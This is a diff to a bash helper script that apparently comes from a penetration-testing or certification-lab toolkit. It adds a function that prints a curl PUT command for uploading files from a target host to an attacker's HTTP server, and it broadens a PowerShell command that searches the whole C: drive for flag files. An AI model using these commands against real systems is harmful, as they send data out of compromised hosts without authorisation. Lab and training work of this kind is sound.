@@ -62,6 +62,23 @@ upload_file() {
     echo "iwr -Uri http://$http_ip:$http_port/$file -InFile $infile -Method Put ;"
 }
 
+upload_file_linux() {
+    local file=$1
+    local infile=$2
+    if [[ -z $infile ]]; then
+        infile=$file
+    fi
+    if [ -z "$file" ]; then
+        echo "File must be specified for upload."
+        return 1
+    fi
+    if [ -z "$http_ip" ] || [ -z "$http_port" ]; then
+        echo "HTTP IP or port is not set."
+        return 1
+    fi
+    echo "curl -X PUT --upload-file $infile http://$http_ip:$http_port/$file"
+}
+
 generate_download_linux() {
     generate_linux_download "$1" "$2"
 }
@@ -97,7 +114,7 @@ remove_return() {
 
 find_flag_windows() {
     echo 'hostname;'
-    echo 'Get-ChildItem -Path C:\ -Recurse -Include local.txt,proof.txt -ErrorAction SilentlyContinue| Get-Content;'
+    echo 'Get-ChildItem -Path C:\ -Recurse -Force -File -Include "local.txt","proof.txt" -ErrorAction SilentlyContinue| Get-Content;'
 }
 
 find_flag_linux(){
